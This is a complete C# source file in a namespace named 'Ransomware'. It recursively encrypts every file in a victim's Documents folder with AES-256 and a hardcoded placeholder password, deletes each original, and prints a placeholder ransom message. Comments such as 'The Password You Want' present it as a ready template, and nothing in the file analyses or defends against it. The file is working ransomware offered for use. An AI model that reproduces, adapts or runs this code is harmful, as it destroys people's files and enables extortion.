using System;
using System.IO;
using System.Security.Cryptography;

namespace Ransomware
{
    class Program
    {
        static void Main(string[] args)
        {
            string directory = @"C:\Users\Victim\Documents";
            string[] files = Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories);

            foreach (string file in files)
            {
                EncryptFile(file);
            }
              //The Message You Want
            Console.WriteLine("Message");
            Console.ReadLine();
        }

        static void EncryptFile(string inputFile)
        {
            //The Password You Want
            string password = "Password-You-Want-Use";
            byte[] salt = GenerateRandomSalt();

            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] keyBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000).GetBytes(256 / 8);
            byte[] ivBytes = GenerateRandomIV();

            using (FileStream inputStream = File.OpenRead(inputFile))
            {
                using (FileStream outputStream = File.Create(inputFile + ".encrypted"))
                {
                    outputStream.Write(salt, 0, salt.Length);
                    outputStream.Write(ivBytes, 0, ivBytes.Length);

                    using (Aes aes = Aes.Create())
                    {
                        aes.KeySize = 256;
                        aes.Key = keyBytes;
                        aes.IV = ivBytes;
                        aes.Mode = CipherMode.CBC;

                        using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            inputStream.CopyTo(cryptoStream);
                        }
                    }
                }
            }

            File.Delete(inputFile);
        }

        static byte[] GenerateRandomSalt()
        {
            byte[] salt = new byte[16];
            using (RNGCryptoServiceProvider rngCsp = new RNGCryptoServiceProvider())
            {
                rngCsp.GetBytes(salt);
            }
            return salt;
        }

        static byte[] GenerateRandomIV()
        {
            byte[] iv = new byte[16];
            using (RNGCryptoServiceProvider rngCsp = new RNGCryptoServiceProvider())
            {
                rngCsp.GetBytes(iv);
            }
            return iv;
        }
    }
}
